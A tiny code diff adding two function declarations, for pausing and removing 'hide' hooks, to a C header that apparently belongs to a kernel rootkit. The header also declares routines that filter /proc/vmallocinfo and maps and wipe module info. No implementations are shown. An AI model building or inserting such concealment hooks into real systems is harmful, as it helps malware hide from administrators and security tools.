@@ -100,6 +100,9 @@ void neverc_krt_maps_filter_add_self(void);
 
 void neverc_krt_mod_wipe_modinfo(struct neverc_krt_this_module *mod);
 
+void neverc_krt_hide_pause_hooks(void);
+void neverc_krt_hide_remove_hooks(void);
+
 
 /* --- /proc/vmallocinfo filter --- */
 
